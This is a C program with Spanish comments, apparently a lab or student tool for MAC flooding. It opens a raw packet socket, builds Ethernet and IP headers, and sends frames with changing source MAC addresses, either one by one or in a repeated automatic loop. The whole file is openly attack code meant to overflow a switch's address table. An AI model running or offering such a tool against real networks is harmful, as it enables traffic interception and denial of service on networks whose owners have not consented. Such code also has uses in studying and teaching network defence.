#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <ctype.h>
#include "ethernetFrame.h"

int main(){

    int total_len = 0;                                                  //Tamaño total
    int if_number;                                                      //Numero interfaz
    int modoDeUso = 0;                                                  //Modo de uso, 0 auto, 1 manual
    int repeticiones = 0;                                               //Numero de frames a enviar
    char if_name[10];                                                   //Nombre interfaz
    int op = 0;
    unsigned char* sendbuff;                                            //Buffer con los datos

    struct ethhdr* eth;                                                 //Estructura frame
    struct iphdr* iph;                                                  //Estructura de paquete
    struct ifreq* ifreq_ip = malloc(sizeof(struct ifreq));              // ??
    struct sockaddr_ll* sadr_ll = malloc(sizeof(struct sockaddr_ll));   // ??
    struct macDest* mdest = malloc(sizeof(struct macDest));             //Estructura MAC Destino
    struct macSrc* msrc = malloc(sizeof(struct macSrc));                //Estructura MAC Origen

    int sock_raw = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);            //Creamos un rawSocket

    if(sock_raw == -1) printf("Error abriendo el socket");              //Verificamos que el socket se creo correctamente

    obtenerNombreInterfaz(if_name);                                     //Obtenemos el nombre de la interfaz a usar

    obtenerNumeroInterfaz(ifreq_ip, sock_raw, if_name, &if_number);     //Obtenemos el numero de nuestra interfaz

    modoDeUso = menuDeUso(&repeticiones);                               //Obtenemos el modo de uso del programa, si manual, o automatico

    ponerMacDestino(mdest);                                             //No importa la macdestino para hacer MAC Flooding

    inizializarMacOrigen(msrc, modoDeUso);                              //Inicializamos una mac origen

    ponerMacOrigen(msrc, modoDeUso);                                    //Ponemos la mac origen

    sendbuff = (unsigned char*) malloc(64);                             //Reservamos memoria para el buffer
    memset(sendbuff, 0, 64);

    construirCabezeraEthernet(eth, msrc, mdest, &total_len, sendbuff);  //Construimos la cabezera ethernet

    construirCabezeraIp(iph, &total_len, ifreq_ip, sendbuff);            //Construimos la cabezera ip

    do{

        enviarFrame(sadr_ll, sock_raw, sendbuff, mdest, if_number);     //Enviamos el frame

        if(modoDeUso == 1){                                             //Modo manual
            do{
                printf("Desea enviar otro frame (1 / 0)\n");
                fflush(stdin);
                scanf("%i", &op);
            }while(op < 0 || op > 1);

        }else{                                                          //Modo automatico
            --repeticiones;
            if(repeticiones == 0){
                do{
                    printf("Desea enviar mas frames?, 0 para no enviar mas\n");
                    fflush(stdin);
                    scanf("%i", &repeticiones);
                }while(repeticiones < 0);
            }
        }

        if(op == 1 || repeticiones > 0) ponerMacOrigen(msrc, modoDeUso);

    }while(op == 1 || repeticiones > 0);

    printf("MAC Flooding completado\n");

    return 0;
}